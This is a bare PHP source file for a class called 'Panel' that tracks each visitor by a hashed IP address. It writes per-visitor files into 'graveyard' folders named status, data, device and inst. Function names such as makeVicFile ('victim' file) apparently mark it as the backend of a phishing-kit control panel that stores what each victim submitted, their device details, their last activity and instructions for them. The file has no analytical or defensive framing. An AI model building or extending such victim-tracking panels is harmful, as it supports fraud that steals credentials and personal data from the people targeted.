<?php
 
class Panel{

    public $IP = null;
    public $HASH = null;
    public $DATA_PATH = (__DIR__)."/graveyard/";
    public $DATA_STATU_PATH = (__DIR__)."/graveyard/status/";
    public $DATA_DATA_PATH = (__DIR__)."/graveyard/data/";
    public $DATA_DEVICE_PATH = (__DIR__)."/graveyard/device/";
    public $DATA_INST_PATH = (__DIR__)."/graveyard/inst/";

    function __construct(){
        if($_SERVER['REMOTE_ADDR']=="::1"){
            $this->IP = "127.0.0.1";
        }else{
        $this->IP = $_SERVER['REMOTE_ADDR'];
        }
        $this->makeVicFile();
    }

    function makeVicFile(){
        if(!file_exists($this->DATA_PATH. $this->getHashName($this->IP))){
            $fp = fopen($this->DATA_PATH. $this->getHashName($this->IP), "w+");
            fwrite($fp, 0);
            fclose($fp);
        }
        if(!file_exists($this->DATA_STATU_PATH. $this->getHashName($this->IP))){
            $fp = fopen($this->DATA_STATU_PATH. $this->getHashName($this->IP), "w+");
            fwrite($fp, time());
            fclose($fp);
        }
    }

    function editVicFile($data, $vip){
        $fp = fopen($this->DATA_PATH. $this->getHashName($vip), "w+");
        fwrite($fp, $data);
        fclose($fp);
    }

    function getHashName($vip){
        $this->HASH =  substr(md5($vip), 0 , 15).".txt";
        return $this->HASH;
    }

    function getData(){
        $data = file_get_contents($this->DATA_PATH. $this->HASH);
        return $data;
    }

    public function getStatu($ip){
        $data = file_get_contents($this->DATA_STATU_PATH. $this->getHashName($ip));
        return $data;
    }

    public function updateStatu($ip){
            $fp = fopen($this->DATA_STATU_PATH. $this->getHashName($ip), "w+");
            fwrite($fp, time());
            fclose($fp);
    }



    public function getD($ip){
        $data = file_get_contents($this->DATA_DATA_PATH. $this->getHashName($ip));
        return $data;
    }

    public function updateD($ip, $content){
            $fp = fopen($this->DATA_DATA_PATH. $this->getHashName($ip), "w+");
            fwrite($fp, $content);
            fclose($fp);
    }

    public function getDevice($ip){
        $data = file_get_contents($this->DATA_DEVICE_PATH. $this->getHashName($ip));
        return $data;
    }

    public function updateDevice($ip, $content){
            $fp = fopen($this->DATA_DEVICE_PATH. $this->getHashName($ip), "w+");
            fwrite($fp, $content);
            fclose($fp);
    }


    
    public function getInst($ip){
        $data = file_get_contents($this->DATA_INST_PATH. $this->getHashName($ip));
        return $data;
    }

    public function updateInst($ip, $content){
            $fp = fopen($this->DATA_INST_PATH. $this->getHashName($ip), "w+");
            fwrite($fp, $content);
            fclose($fp);
    }


}




?>